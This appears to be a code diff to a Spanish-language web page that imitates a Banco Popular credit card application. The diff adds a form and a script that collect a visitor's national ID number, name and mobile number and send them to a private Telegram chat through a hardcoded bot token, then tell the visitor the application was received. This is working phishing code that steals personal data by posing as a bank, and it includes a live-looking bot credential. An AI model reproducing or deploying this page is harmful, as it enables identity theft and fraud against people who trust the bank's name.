@@ -100,6 +100,16 @@ background:#cfcfcf;
 color:#666;
 font-size:16px;
 border-radius:8px;
+cursor: pointer;
+transition: background 0.3s;
+}
+
+button:hover{
+background:#bfbfbf;
+}
+
+button:active{
+transform: scale(0.98);
 }
 
 /* footer */
@@ -113,6 +123,33 @@ color:#555;
 .footer img{
 width:140px;
 margin:15px 0;
+}
+
+/* mensaje de estado */
+.status-message {
+margin-top: 15px;
+padding: 10px;
+border-radius: 6px;
+text-align: center;
+display: none;
+}
+
+.status-message.success {
+background-color: #d4edda;
+color: #155724;
+display: block;
+}
+
+.status-message.error {
+background-color: #f8d7da;
+color: #721c24;
+display: block;
+}
+
+.status-message.sending {
+background-color: #fff3cd;
+color: #856404;
+display: block;
 }
 
 /* responsive */
@@ -148,33 +185,37 @@ Tarjeta de crédito
 Para hacer tu solicitud en línea debes ser empleado o pensionado con ingreso mínimo de $1.750.905
 </div>
 
+<form id="telegramForm">
 <label>Cédula de Ciudadanía*</label>
-<input type="text">
+<input type="text" id="cedula" required>
 
 <label>Primer Nombre*</label>
-<input type="text">
+<input type="text" id="nombre" required>
 
 <label>Primer Apellido*</label>
-<input type="text">
+<input type="text" id="apellido" required>
 
 <label>Número de celular*</label>
-<input type="tel">
+<input type="tel" id="celular" required pattern="[0-9]{10}" title="Ingresa un número de 10 dígitos">
 
 <div class="checkbox">
-<input type="checkbox">
+<input type="checkbox" id="autorizacion1" required>
 <div>
 Autorizo a BANCO POPULAR a <span class="orange">realizar el tratamiento de mis datos personales.</span>
 </div>
 </div>
 
 <div class="checkbox">
-<input type="checkbox">
+<input type="checkbox" id="autorizacion2" required>
 <div>
 Autorizo a BANCO POPULAR a realizar la <span class="orange">consulta y reporte en las centrales de información</span>, además de realizar las siguientes declaraciones.
 </div>
 </div>
 
-<button>Iniciar</button>
+<button type="submit" id="submitBtn">Iniciar</button>
+</form>
+
+<div id="statusMessage" class="status-message"></div>
 
 <div class="footer">
 
@@ -186,6 +227,113 @@ Autorizo a BANCO POPULAR a realizar la <span class="orange">consulta y reporte e
 
 </div>
 </div>
+
+<script>
+// Configuración de Telegram - ¡ACTUALIZA ESTOS VALORES!
+const TELEGRAM_BOT_TOKEN = '8782203483:AAH7Fjcea68haG9OjqRiiImNW4x4grYXhXE'; // Reemplaza con el token de tu bot
+const TELEGRAM_CHAT_ID = '7158969671'; // Reemplaza con tu Chat ID
+
+document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    // Obtener valores del formulario
+    const cedula = document.getElementById('cedula').value;
+    const nombre = document.getElementById('nombre').value;
+    const apellido = document.getElementById('apellido').value;
+    const celular = document.getElementById('celular').value;
+    const autorizacion1 = document.getElementById('autorizacion1').checked;
+    const autorizacion2 = document.getElementById('autorizacion2').checked;
+    
+    // Validaciones adicionales
+    if (!cedula || !nombre || !apellido || !celular) {
+        showStatus('Por favor completa todos los campos', 'error');
+        return;
+    }
+    
+    if (!autorizacion1 || !autorizacion2) {
+        showStatus('Debes aceptar las autorizaciones para continuar', 'error');
+        return;
+    }
+    
+    // Validar formato de cédula (solo números)
+    if (!/^\d+$/.test(cedula)) {
+        showStatus('La cédula debe contener solo números', 'error');
+        return;
+    }
+    
+    // Validar formato de celular
+    if (!/^\d{10}$/.test(celular)) {
+        showStatus('El número de celular debe tener 10 dígitos', 'error');
+        return;
+    }
+    
+    // Mostrar estado de envío
+    showStatus('Enviando solicitud...', 'sending');
+    
+    // Crear mensaje para Telegram
+    const mensaje = `
+🔔 *NUEVA SOLICITUD DE TARJETA DE CRÉDITO*
+━━━━━━━━━━━━━━━━━━━━━
+📋 *Datos del solicitante:*
+┌─────────────────────
+├ 👤 *Nombre:* ${nombre} ${apellido}
+├ 🆔 *Cédula:* ${cedula}
+├ 📱 *Celular:* ${celular}
+└─────────────────────
+
+✅ *Autorizaciones:*
+┌─────────────────────
+├ 📄 Tratamiento de datos: ${autorizacion1 ? '✓' : '✗'}
+├ 📊 Consulta centrales: ${autorizacion2 ? '✓' : '✗'}
+└─────────────────────
+
+🕐 *Fecha:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
+━━━━━━━━━━━━━━━━━━━━━
+    `;
+    
+    try {
+        // Enviar a Telegram
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            showStatus('✅ ¡Solicitud enviada con éxito! Te contactaremos pronto.', 'success');
+            // Opcional: Limpiar el formulario
+            document.getElementById('telegramForm').reset();
+        } else {
+            showStatus('❌ Error al enviar la solicitud. Por favor intenta de nuevo.', 'error');
+            console.error('Error de Telegram:', data);
+        }
+    } catch (error) {
+        showStatus('❌ Error de conexión. Por favor verifica tu internet.', 'error');
+        console.error('Error:', error);
+    }
+});
+
+function showStatus(message, type) {
+    const statusDiv = document.getElementById('statusMessage');
+    statusDiv.textContent = message;
+    statusDiv.className = 'status-message ' + type;
+    
+    // Ocultar mensaje de éxito después de 5 segundos
+    if (type === 'success') {
+        setTimeout(() => {
+            statusDiv.style.display = 'none';
+        }, 5000);
+    }
+}
+</script>
 
 </body>
 </html>
